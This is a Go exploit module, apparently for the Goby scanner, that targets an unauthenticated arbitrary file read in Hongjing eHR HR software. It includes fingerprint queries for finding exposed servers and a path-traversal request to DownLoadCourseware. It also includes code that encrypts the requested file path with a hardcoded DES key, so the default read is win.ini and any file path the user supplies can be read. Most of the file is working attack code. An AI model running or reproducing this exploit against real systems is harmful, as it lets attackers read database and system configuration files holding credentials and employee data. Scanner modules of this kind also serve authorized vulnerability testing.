package exploits

import (
	"bytes"
	"crypto/cipher"
	"crypto/des"
	"encoding/base64"
	"fmt"
	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
	"strings"
)

func init() {
	expJson := `{
    "Name": "Hongjing eHR /w_selfservice/oauthservlet/../../DownLoadCourseware File Read Vulnerability",
    "Description": "<p>Hongjing eHR Human Resources Management Software is a software that integrates human resources management with digital applications to meet dynamic, collaborative, process-based and strategic needs. </p><p> There is an arbitrary file read vulnerability in the Hongjing eHR /w_selfservice/oauthservlet/%2e./.%2e/DownLoadCourseware interface. Unauthenticated attackers can use this vulnerability to read important system files (such as database configuration files, system configuration files), database configuration files, etc., causing the website to be extremely unsafe.</p>",
    "Product": "HJSoft-HCM",
    "Homepage": "http://www.hjsoft.com.cn/",
    "DisclosureDate": "2024-07-05",
    "PostTime": "2024-07-11",
    "Author": "liuzhenqi@baimaohui.net",
    "FofaQuery": "(title=\"人力资源信息管理系统\" && body=\"src=\\\"/images/hcm/copyright.gif\\\"\") || body=\"src=\\\"/images/hcm/themes/default/login/login_banner2.png?v=12334\\\"\" || body=\"src=\\\"/general/sys/hjaxmanage.js\\\"\" || body=\"宏景软件 版权所有</div>\" || banner=\"templates/index/hcmlogon.jsp\"",
    "GobyQuery": "(title=\"人力资源信息管理系统\" && body=\"src=\\\"/images/hcm/copyright.gif\\\"\") || body=\"src=\\\"/images/hcm/themes/default/login/login_banner2.png?v=12334\\\"\" || body=\"src=\\\"/general/sys/hjaxmanage.js\\\"\" || body=\"宏景软件 版权所有</div>\" || banner=\"templates/index/hcmlogon.jsp\"",
    "Level": "1",
    "Impact": "<p>There is an arbitrary file read vulnerability in the DownLoadCourseware interface of Hongjing eHR. Unauthenticated attackers can use this vulnerability to read important system files (such as database configuration files, system configuration files), database configuration files, etc., causing the website to be extremely unsafe.</p>",
    "Recommendation": "<p>1. Set interface access permissions. </p><p>2. Update the software to a secure version or contact the manufacturer to obtain a patch.</p>",
    "References": [],
    "Is0day": false,
    "HasExp": true,
    "ExpParams": [
        {
            "name": "mode",
            "type": "select",
            "value": "win_ini,Customize",
            "show": ""
        },
        {
            "name": "Customize",
            "type": "input",
            "value": "C:/windows/win.ini",
            "show": "mode=Customize"
        }
    ],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "Tags": [
        "File Read"
    ],
    "VulType": [
        "File Read"
    ],
    "CVEIDs": [
        ""
    ],
    "CNNVD": [
        ""
    ],
    "CNVD": [
        ""
    ],
    "CVSSScore": "7.8",
    "Translation": {
        "CN": {
            "Name": "宏景eHR /w_selfservice/oauthservlet/../../DownLoadCourseware 文件读取漏洞",
            "Product": "HJSOFT-HCM",
            "Description": "<p>宏景eHR人力资源管理软件是一款人力资源管理与数字化应用相融合，满足动态化、协同化、流程化、战略化需求的软件。<br></p><p>宏景eHR /w_selfservice/oauthservlet/%2e./.%2e/DownLoadCourseware 接口处存在任意文件读取漏洞，未经身份验证攻击者可通过该漏洞读取系统重要文件（如数据库配置文件、系统配置文件）、数据库配置文件等等，导致网站处于极度不安全状态。<br></p>",
            "Recommendation": "<p>1、设置接口访问权限。</p><p>2、更新软件至安全版本或联系厂商获取补丁。</p>",
            "Impact": "<p>宏景eHR DownLoadCourseware 接口处存在任意文件读取漏洞，未经身份验证攻击者可通过该漏洞读取系统重要文件（如数据库配置文件、系统配置文件）、数据库配置文件等等，导致网站处于极度不安全状态。<br></p>",
            "VulType": [
                "文件读取"
            ],
            "Tags": [
                "文件读取"
            ]
        },
        "EN": {
            "Name": "Hongjing eHR /w_selfservice/oauthservlet/../../DownLoadCourseware File Read Vulnerability",
            "Product": "HJSoft-HCM",
            "Description": "<p>Hongjing eHR Human Resources Management Software is a software that integrates human resources management with digital applications to meet dynamic, collaborative, process-based and strategic needs.&nbsp;</p><p>&nbsp;There is an arbitrary file read vulnerability in the Hongjing eHR /w_selfservice/oauthservlet/%2e./.%2e/DownLoadCourseware interface. Unauthenticated attackers can use this vulnerability to read important system files (such as database configuration files, system configuration files), database configuration files, etc., causing the website to be extremely unsafe.</p>",
            "Recommendation": "<p>1. Set interface access permissions.&nbsp;</p><p>2. Update the software to a secure version or contact the manufacturer to obtain a patch.</p>",
            "Impact": "<p>There is an arbitrary file read vulnerability in the DownLoadCourseware interface of Hongjing eHR. Unauthenticated attackers can use this vulnerability to read important system files (such as database configuration files, system configuration files), database configuration files, etc., causing the website to be extremely unsafe.<br></p>",
            "VulType": [
                "File Read"
            ],
            "Tags": [
                "File Read"
            ]
        }
    },
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "PocGlobalParams": {},
    "ExpGlobalParams": {},
    "PocId": "10969"
}`

	filePathEncode_7ghzlKIxKPW4xb1l := func(filepath string) string {
		keyPassword := "ilovethisgame"
		var iv = []byte{1, 2, 3, 4, 5, 6, 7, 8}

		encrypt := func(key, plaintext string) (string, error) {
			// Ensure key is exactly 8 bytes
			keyBytes := []byte(key)
			if len(keyBytes) > 8 {
				keyBytes = keyBytes[:8]
			} else if len(keyBytes) < 8 {
				padding := make([]byte, 8-len(keyBytes))
				keyBytes = append(keyBytes, padding...)
			}

			block, err := des.NewCipher(keyBytes)
			if err != nil {
				return "", err
			}

			padding := block.BlockSize() - len(plaintext)%block.BlockSize()
			padtext := bytes.Repeat([]byte{byte(padding)}, padding)
			paddedText := append([]byte(plaintext), padtext...)

			blockMode := cipher.NewCBCEncrypter(block, iv)
			ciphertext := make([]byte, len(paddedText))
			blockMode.CryptBlocks(ciphertext, paddedText)

			return base64.StdEncoding.EncodeToString(ciphertext), nil
		}

		encryptEncode := func(key, plaintext string) (string, error) {
			encrypted, err := encrypt(key, plaintext)
			if err != nil {
				return "", err
			}

			// Replace symbols as per Java code
			encrypted = strings.ReplaceAll(encrypted, "%", "@2HJ5@")
			encrypted = strings.ReplaceAll(encrypted, "+", "@2HJB@")
			encrypted = strings.ReplaceAll(encrypted, " ", "@2HJ0@")
			encrypted = strings.ReplaceAll(encrypted, "/", "@2HJF@")
			encrypted = strings.ReplaceAll(encrypted, "?", "@3HJF@")
			encrypted = strings.ReplaceAll(encrypted, "#", "@2HJ3@")
			encrypted = strings.ReplaceAll(encrypted, "&", "@2HJ6@")
			encrypted = strings.ReplaceAll(encrypted, "=", "@3HJD@")
			encrypted = strings.ReplaceAll(encrypted, "\r\n", "")
			encrypted = strings.ReplaceAll(encrypted, "\n", "")
			encrypted = strings.ReplaceAll(encrypted, "\r", "")
			encrypted = strings.ReplaceAll(encrypted, "@", "PAATTP")

			return encrypted, nil
		}

		encrypted, err := encryptEncode(keyPassword, filepath)
		if err != nil {
			fmt.Println("Error encrypting:", err)
			return ""
		}

		return encrypted
	}

	setPayloadRequestHash_gO6cUHOtn2fq5crF := func(hostInfo *httpclient.FixUrl, fileUrl string) (string, string, error) {

		setGetRequest := func(hostInfo *httpclient.FixUrl, urlGet string, head map[string]string) (*httpclient.HttpResponse, error) {
			GetRequest := httpclient.NewGetRequestConfig(urlGet)
			GetRequest.Timeout = 12
			GetRequest.VerifyTls = false
			GetRequest.FollowRedirect = false
			for headName, headValue := range head {
				GetRequest.Header.Store(headName, headValue)
			}
			return httpclient.DoHttpRequest(hostInfo, GetRequest)
		}

		//加密后的文件路径
		pathEncode := filePathEncode_7ghzlKIxKPW4xb1l(fileUrl)

		//漏洞url地址
		url := "/w_selfservice/oauthservlet/%2e./.%2e/DownLoadCourseware?url=" + pathEncode
		header := map[string]string{
			"User-Agent": "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.36",
		}

		resp, err := setGetRequest(hostInfo, url, header)
		if err != nil || resp.StatusCode != 200 {
			return "", "", err
		}
		//命令执行的结果，如果结果是编码的，请自己解码后返回，如果返回为空的字符串，则判断命令执行失败
		readResult := resp.RawBody

		vulUrl := "/w_selfservice/oauthservlet/%2e./.%2e/DownLoadCourseware?url="

		return readResult, vulUrl, nil
	}

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		func(exp *jsonvul.JsonVul, u *httpclient.FixUrl, ss *scanconfig.SingleScanConfig) bool {
			// 函数继承
			readFileFunc := setPayloadRequestHash_gO6cUHOtn2fq5crF
			// 此处需要修改：字典键为请求的URL地址，值为返回包判断成功的条件
			defaultModeMap := map[string]string{
				"C:/windows/win.ini": "fonts",
			}

			for filePath, fileContent := range defaultModeMap {
				pocResult, pocUrl, err := readFileFunc(u, filePath)
				if err != nil {
					continue
				}

				// 判断响应内容是否包含期望的内容
				if strings.Contains(pocResult, fileContent) {
					// 设置VULURL
					ss.VulURL = u.HostInfo + pocUrl
					return true
				}
			}

			return false
		},

		func(expResult *jsonvul.ExploitResult, ss *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {
			var fileUrl string
			var fileText string
			mode := goutils.B2S(ss.Params["mode"])

			// 此处需要修改：字典键为用户选择读取文件的类型，值是一个数组，分别为请求的URL地址，返回包判断成功的条件
			defaultModeMap := map[string][2]string{
				"win_ini": {"C:/windows/win.ini", "fonts"},
			}
			// 此处需要修改：函数继承
			readFileFunc := setPayloadRequestHash_gO6cUHOtn2fq5crF

			// 请注意，后续代码为模板固化，正常情况下均无需修改
			if mode == "Customize" {
				fileUrl = goutils.B2S(ss.Params["Customize"])
			} else {
				if _, ok := defaultModeMap[mode]; ok {
					fileUrl = defaultModeMap[mode][0]
					fileText = defaultModeMap[mode][1]
				} else {
					expResult.Success = false
					return expResult
				}
			}

			// 获取返回结果url和返回请求头
			pocResult, _, err := readFileFunc(expResult.HostInfo, fileUrl)
			if err != nil || (!strings.Contains(pocResult, fileText) && mode != "Customize") {
				expResult.Success = false
				return expResult
			}
			expResult.Success = true
			expResult.Output = pocResult
			return expResult
		},
	))
}
